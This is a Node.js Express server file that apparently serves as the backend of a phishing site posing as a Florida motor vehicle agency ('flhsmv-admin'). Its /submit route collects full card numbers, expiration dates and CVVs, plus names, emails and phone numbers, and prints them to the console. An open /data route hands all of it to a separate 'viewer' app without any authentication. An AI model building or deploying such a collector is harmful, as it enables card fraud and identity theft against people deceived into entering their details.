const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 4000;

// ✅ Allow all origins during testing or explicitly allow Vercel domain
app.use(cors({
  origin: [
    "https://flhsmv-admin.vercel.app", // Vercel deployed viewer app
    "http://localhost:3000"            // local viewer app (optional for testing)
  ]
}));

app.use(bodyParser.json());

// ✅ In-memory storage (will reset on redeploy)
let storage = [];

// ✅ POST route for submissions
app.post("/submit", (req, res) => {
  const { name, email, phone, subject, message, cardNumber, expirationDate, cvv } = req.body;

  if (
    typeof cardNumber === "string" &&
    cardNumber.length === 16 &&
    typeof expirationDate === "string" &&
    typeof cvv === "string" &&
    (cvv.length === 3 || cvv.length === 4)
  ) {
    storage.push({ cardNumber, expirationDate, cvv });
    console.log("Stored Payment Info:", storage);
    return res.status(200).json({ message: "Payment data stored successfully" });
  }

  if (name && email && phone && subject && message) {
    storage.push({ name, email, phone, subject, message });
    console.log("Stored Contact Info:", storage);
    return res.status(200).json({ message: "Contact data stored successfully" });
  }

  res.status(400).json({ message: "Invalid or incomplete data submitted." });
});

// ✅ GET route for viewer app to fetch all data
app.get("/data", (req, res) => {
  res.status(200).json(storage);
});

// ✅ Health check
app.get("/ping", (req, res) => {
  res.status(200).json({ message: "Viewer app connected successfully!" });
});

// ✅ Start server
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
